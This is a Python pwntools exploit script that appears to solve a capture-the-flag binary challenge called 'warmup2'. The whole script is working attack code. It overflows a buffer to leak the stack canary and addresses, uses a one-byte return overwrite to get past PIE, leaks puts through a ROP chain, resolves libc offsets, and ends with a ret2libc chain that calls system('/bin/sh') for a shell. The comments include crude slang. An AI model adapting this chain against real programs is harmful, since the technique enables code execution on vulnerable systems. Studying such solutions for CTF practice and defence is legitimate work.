#!/usr/bin/env python3

from pwn import *
import binascii
import sgtlibc

exe = ELF("./chal")
rop = ROP(exe)

context.binary = exe
context.log_level = "DEBUG"

padding = b"a" * 264
more_padding = b"a" * 8
main_after_vuln = 0x12e2

def conn():
	if False:
		return remote("warmup2.ctf.maplebacon.org", 1337)
	else:
		return process([exe.path])

# Doing some leaky shart and a partial overwrite to bypass PIE
r = conn()
r.recvuntil(b"name?")
r.sendline(padding) # leaks both canary and what seems to be a stack address bc printf reads up until a nullbyte
res = r.recvuntil(b"you?")
canary = b'\x00' + res[0x110:0x117]
stack_leak = res[0x117:0x11d]
log.info(f"Canary leaked: {binascii.hexlify(canary[::-1])}")
log.info(f"Stack address leaked (Base Pointer): {hex(int.from_bytes(stack_leak, 'little'))}")
r.send(padding + canary + more_padding + b"\xdd") # one-byte overwrite to get back to main, call instrution to invoke vuln() (0x12dd), calling main misaligns stack
r.recvuntil(b'name?')
r.send(padding + more_padding * 2) # bc of the behavior mentioned for the first payload, I can also leak off main's addr in the eip (buffer size plus canary size plus rbp size get me there)
res = r.recvuntil(b'you?')
main_addr_leak = res[0x11f:0x125] + b"\x00" * 2 # ret addr holds addr of instruction in main after vuln() is called (offset is 0x12e2)
log.info(f"main() intruction address leaked: {binascii.hexlify(main_addr_leak[::-1])}")
base_addr = int.from_bytes(main_addr_leak, 'little') - main_after_vuln # with this, we can now activate ret2libc powers
log.info(f"Base address calculated: {hex(base_addr)}")

# Now, it's classic ret2libc
pop_rdi = p64(base_addr + rop.rdi.address)
puts_plt = p64(base_addr + exe.plt['puts'])
puts_got = p64(base_addr + exe.got['puts'])
main = p64(base_addr + exe.symbols['vuln']) # call vuln() in main() to prevent crash
log.info(f"pop rdi gadget address calculated: {hex(int.from_bytes(pop_rdi, 'little'))}")
log.info(f"puts() PLT address calculated: {hex(int.from_bytes(puts_plt, 'little'))}")
log.info(f"puts() GOT address calculated: {hex(int.from_bytes(puts_got, 'little'))}")
log.info(f"main() instruction address calculated: {hex(int.from_bytes(main, 'little'))}")
r.send(padding + canary + more_padding + pop_rdi + puts_got + puts_plt + main)
res = r.recvuntil(b'name?')
puts_libc = int.from_bytes(res[0x118:0x11e], 'little')
log.info(f"puts() address leaked: {hex(puts_libc)}")

# Trying out a LibC-seraching database
s = sgtlibc.Searcher()
s.add_condition('puts', puts_libc)
data = s.dump(db_index=2) # data entries of offsets in libc file
log.info(str(data))

# Pop that shussy like I need
libc_base = puts_libc - data['puts']
ret = p64(base_addr + rop.ret.address)
system = p64(libc_base + data['system'])
bin_sh = p64(libc_base + data['str_bin_sh'])
log.info(f"Calculated ret gadget address: {hex(int.from_bytes(ret, 'little'))}")
log.info(f"Calculated system() address: {hex(int.from_bytes(system, 'little'))}")
log.info(f"Calculated /bin/sh address: {hex(int.from_bytes(bin_sh, 'little'))}")
#r.sendline(b"junk")
#r.recvuntil(b'you?')
r.send(padding + canary + more_padding + ret * 4 + pop_rdi + bin_sh + system)
#r.send(padding + canary + more_padding + pop_rdi + puts_got + puts_plt + main)

r.interactive()
